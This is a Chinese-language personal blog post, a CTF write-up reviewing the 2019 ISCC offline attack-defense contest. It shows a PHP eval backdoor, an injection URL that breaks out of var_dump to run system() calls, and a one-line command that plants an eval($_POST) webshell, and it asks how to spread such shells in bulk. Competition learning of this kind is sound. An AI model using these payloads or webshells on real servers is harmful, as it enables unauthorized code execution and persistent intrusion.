<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019 ISCC线下赛回顾 - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1-私地渗透"><span class="toc-text">web1 私地渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php中单引号与双引号的区别"><span class="toc-text">php中单引号与双引号的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php变量覆盖"><span class="toc-text">php变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用过程"><span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#私地与高地"><span class="toc-text">私地与高地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#主要问题"><span class="toc-text">主要问题</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019 ISCC线下赛回顾
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2018-07-22 15:00:00</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#比赛回顾" title="比赛回顾">比赛回顾</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <p>不比不知道自己跟大佬差距有多大！开局直接全场被大佬挂黑页，等着运维回复几个小时之后好不容易找到shell路径，shell又被其他大佬删了…真是菜哭了，一下午的比赛毫无作为…</p>
<a id="more"></a>

<h2 id="web1-私地渗透"><a href="#web1-私地渗透" class="headerlink" title="web1 私地渗透"></a>web1 私地渗透</h2><p>先是注册页面拿到shell路径，具体操作看SQL那篇吧。</p>
<p>拿到路径之后访问之后是这样的</p>
<pre><code>&lt;?php
show_source(__FILE__);
$a=@$_REQUEST[&apos;a&apos;];
@eval(&quot;var_dump($$a);&quot;);
?&gt;</code></pre><p>先分析一下代码，主要几个函数</p>
<ul>
<li>show_source():查看文件源码</li>
<li>eval():把字符串当做php代码执行</li>
<li>var_dump():打印变量信息，返回值为null</li>
</ul>
<p>这里有明显的变量引用，我们可以控制$a的值来命令执行。</p>
<h3 id="php中单引号与双引号的区别"><a href="#php中单引号与双引号的区别" class="headerlink" title="php中单引号与双引号的区别"></a>php中单引号与双引号的区别</h3><pre><code>&lt;?php
$c=&quot;Luc1fer!&quot;;
echo &quot;My name is &quot;.$c.&quot;&lt;br&gt;&quot;;       //不加引号
echo &quot;My name is &quot;.&apos;$c&apos;.&quot;&lt;br&gt;&quot;;        //单引号
echo &quot;My name is &quot;.&quot;$c&quot;.&quot;&lt;br&gt;&quot;;        //双引号
echo &quot;My name is &quot;.&quot; &apos;$c&apos; &quot;.&quot;&lt;br&gt;&quot;;    //双引号+单引号
echo &quot;My name is &quot;.&apos; &quot;$c&quot; &apos;.&quot;&lt;br&gt;&quot;; //单引号+双引号
?&gt;</code></pre><p>输出结果如下</p>
<pre><code>My name is Luc1fer!                    //正常显示
My name is $c                        //单引号不被解析
My name is Luc1fer!                    //双引号内正常解析
My name is &apos;Luc1fer!&apos;                //双引号内正常解析
My name is &quot;$c&quot;                     //单引号内不被解析</code></pre><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>测试代码：</p>
<pre><code>&lt;?php
show_source(__FILE__);
$b=&quot;Hello,my name is Luc1fer!&quot;;
$a=@$_REQUEST[&apos;a&apos;];
echo $$a;
?&gt;</code></pre><p>结果如下：</p>
<pre><code> &lt;?php
show_source(__FILE__);
$b=&quot;Hello,my name is Luc1fer!&quot;;
$a=@$_REQUEST[&apos;a&apos;];
echo $$a;
?&gt; Hello,my name is Luc1fer!</code></pre><p>代码的执行过程大概为  <code>get一个a--&gt;echo执行从右到左--&gt;echo $$a--&gt;echo $b--&gt;打印$b</code><br>我们可以通过?a=a=”hello”这样的方式来打印hello</p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>对于var_dump()我们可以构造单引号使其闭合</p>
<pre><code>&lt;?php
show_source(__FILE__);
$a=@$_REQUEST[&apos;a&apos;];
@eval(&quot;var_dump($$a);&quot;);
?&gt;

http://localhost/only-test-php.php?a=a=4);system(phpinfo()</code></pre><p>这样就可以打印phpinfo()信息了</p>
<p>同样的我们可以cat flag了.</p>
<h2 id="私地与高地"><a href="#私地与高地" class="headerlink" title="私地与高地"></a>私地与高地</h2><h3 id="主要问题"><a href="#主要问题" class="headerlink" title="主要问题"></a>主要问题</h3><p>等拿到私地权限之后就只剩40多分钟了，WINSCP死活连不上私地，没办法像往常一样down源码，上监控上waf，有点手忙脚乱，这边Xshell连上了，查看www目录发现全是马，打开几个手动注释了马，其他的都是readonly文件</p>
<ol>
<li>面对被写上的马，如果我是ctf权限，且文件readonly该怎么删掉这个马？</li>
</ol>
<p>赛后和老师讨论，老师说连不上WINSCP为什么不用wegt命令下源码？这个当时确实没想到，下次要注意。还有没上脚本的问题，同学指出可以直接用vim打开之后复制粘贴进去监控脚本，这个当时确实懵圈了，只在那傻傻的手工注释。</p>
<p>2.面对不死马我该怎么去删掉这个不死马？</p>
<p>比赛前准备的方法有kill进程、重启Apache、创建同名文件，这些在这次比赛中都没有真正实践到</p>
<p>3.如何在拿到权限之后批量给别人传马？</p>
<p>说实话我这个地方还是没懂，按理说应该是利用预留的后门然后执行写入命令</p>
<pre><code>echo -e &quot;&lt;?php eval(\@_POST[&apos;a&apos;]);?&gt;&quot; &gt; index.php | chomod 777 index.php</code></pre><p>但是怎么批量呢？用批量提交flag那个么？还带去问问师傅</p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
